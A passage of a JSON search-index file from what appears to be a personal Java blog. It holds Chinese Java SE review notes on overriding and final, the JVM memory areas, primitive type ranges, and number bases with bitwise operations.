重写：子类中出现了和父类中方法声明一模一样的方法。与返回值类型有关,返回值类型是一致的 4、overload 重载：本类中出现的方法名一样，参数列表不同的方法。与返回值类型无关。 继承中的成员方法关系 、子、父类有相同方法并且返回值类型也一样，那么会调用子类的方法，也叫方法重写 final概述 它可以用来修饰 类与变量 修饰之后表示它是“最终的”不能被继续操作了 final修饰特点 修饰类，类不能被继承 修饰变量：变量就变成了常量，只能被赋值一次，通常与public static配套使用 修饰方法：方法不能被重写，表示最终方法。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"面向对象","slug":"面向对象","permalink":"http://liuhaoan.github.io/tags/面向对象/"},{"name":"代码块","slug":"代码块","permalink":"http://liuhaoan.github.io/tags/代码块/"}]},{"title":"javaSE复习之——java的五大内存区域","slug":"javaSE复习之——java的五大内存区域","date":"2019-04-05T15:40:17.000Z","updated":"2019-04-08T12:27:31.029Z","comments":true,"path":"2019/04/05/javaSE复习之——java的五大内存区域/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——java的五大内存区域/","excerpt":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆","text":"五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆 Java程序运行过程 1、加载字节码文件到方法区（.class文件） 2、程序代码依次进栈（jvm执行main方法） 堆（heap）： 最大的一块内存，存放对象实例的地方 1、Java堆是垃圾收集器管理的主要区域，也称GC堆。 2、Java堆物理上可不连续，逻辑上连续。 3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常 虚拟机栈（stack）： java方法执行时的内存模型 栈帧 1、每个方法都会在虚拟机栈中创建一个对应的栈帧，用于存储局部变量表，操作数栈，动态链接，方法出口等信息。 2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈入栈到出栈。 局部变量表 1、存放编译期可知在方法中各种基本数据类型和对象的引用，基本数据类型直接存值, 引用数据类型存地址。 #本地方法栈： 本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务 本地方法 关键字 native ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。 有的虚拟机将本地方法栈和虚拟机栈合在一起，如HotSpot。 方法区： 存已经被虚拟机加载的类信息（Class对象）、常量、静态变量、即时编译器JIT编译过后的代码数据。 jdk 1.7、1.8 对方法区做出了修改，1.8 取消了方法区。 1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap 2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。 3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。 运行时常量池 1、在方法区，用来存放编译期生成的各种符号引用和字面量 2、编译期将各种符号引用和字面量放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时复制到局部变量表中。1.7开始字符串常量池被移入堆中。 符号引用： String ss = “asdsfg” ss这个符号就是符号引用。解析阶段解析为直接引用 字面量： 值本身 如 asdfg 常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。 寄存器（程序计数器）： 占用较小的一块内存空间，当执行Java方法时记录正在执行的虚拟机字节码指令地址，如果执行Native方法则计时器值为空。","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"javaSE","slug":"javaSE","permalink":"http://liuhaoan.github.io/tags/javaSE/"}]},{"title":"javaSE复习之——数据类型","slug":"javaSE复习之——数据类型","date":"2019-04-05T12:47:43.000Z","updated":"2019-04-08T11:51:09.510Z","comments":true,"path":"2019/04/05/javaSE复习之——数据类型/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——数据类型/","excerpt":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D","text":"基本数据分为四大类 重要：以后面试可能会问范围 注：通常在复制 long float类型时都价格标识符 ，即 L 与 f 。这样不会因为数据类型而出错double类型也可以在后面加D 整数型（整数常亮默认为int类型） byte：占一个字节 -128 ~ 127 short：占两个字节 -2^15 ~ 2^15-1 int：占四个字节 -2^31 ~ 2^31-1 long：占八个字节 -2^63 ~ 2^63-1 浮点型（小数型，默认小数是double类型） float：占四个字节 -2^128 ~ 2^128 绝对保证精度6位，但有7位有效数字 double：占八个字节 -2^1024 ~ 2^1024 绝对保证精度15位，但有16位有效数字 字符型 char：占两个字节 0 ~ 65535 布尔型（判断） boolean：理论八分之一字节，因为只要0和1就能分别决定false和true了，但是boolean并没有明确指定大小 ps：float由32个二进制位组成，1位代表符号、8位代表指数位 00000000-11111111 同等与 0 - 255 其中 255代表无穷大，指数范围就是-126 ~ 127这比long的63大，所以float虽然才四个字节但是比long范围大","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"数据类型","slug":"数据类型","permalink":"http://liuhaoan.github.io/tags/数据类型/"}]},{"title":"javaSE复习之——进制编码","slug":"javaSE复习之——进制编码","date":"2019-04-05T12:27:44.000Z","updated":"2019-04-08T11:49:23.610Z","comments":true,"path":"2019/04/05/javaSE复习之——进制编码/","link":"","permalink":"http://liuhaoan.github.io/2019/04/05/javaSE复习之——进制编码/","excerpt":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0","text":"进制的运算 二进制向右移动两位 ：15 &gt;&gt; 2 = 3 ps：1111 向右移动两位 等于 0011 = 3 二进制向左移动两位 ：15 &lt;&lt; 2 = 60 ps：1111 向左移动两位 等于 111100 = 60 异或运算 ：2 ^ 3 = 1 例子：0010 ^ 0011 = 0001 ps：也就是相同为0不同为1，当0001^0011或者0001^0010时都能得出另一个数，和乘法除法运算一样 与运算 ：2 &amp; 3 = 2 例子：0010 &amp; 0011=0010 “与”运算中也是二进制位的运算，只要有一个是0那么结果就是0 java中的数据表示法 在java中数据前面加 0x表示16进制 0b表示二进制 0表示8进制 进制转换 任何进制转10进制都是 每一位 第某位的数据 乘 被转换的进制数 的 第某位索引次幂 相加 例子八转10：10120=1 * 8 ^ 2 + 2 * 8 ^ 1 + 0 * 8 ^ 0 = 80 10进制转任何进制都是 除 要转换的进制数 然后取余数，以此类推，最后得出的数据为：进制数从左到右 = 余数列表的从下到上 2、8互转与2、16互转方法： 2转8 = 3位一组转8 8转2 = 每一位转2 2转16 = 4位一组转16 16转2 = 每一位转2 二进制快速转换10进制方法： 二进制：1 1 1 1 1 1 1 1 十进制：128 64 32 16 8 4 2 1 二进制表示法: 符号位0为正，1为负 计算机二进制运算原理 计算机二进制运算都是用补码 例子： +7 的原码是 0 0000111 ps：正数的、原码、反码、补码都一样 -7 的原码为 1 0000111 反码为 1 1111000 （符号位不变） 补码为 1 1111001（在反码的基础上加1）","categories":[{"name":"JavaSE 复习","slug":"JavaSE-复习","permalink":"http://liuhaoan.github.io/categories/JavaSE-复习/"}],"tags":[{"name":"进制编码","slug":"进制编码","permalink":"http://liuhaoan.github.io/tags/进制编码/"}]}]}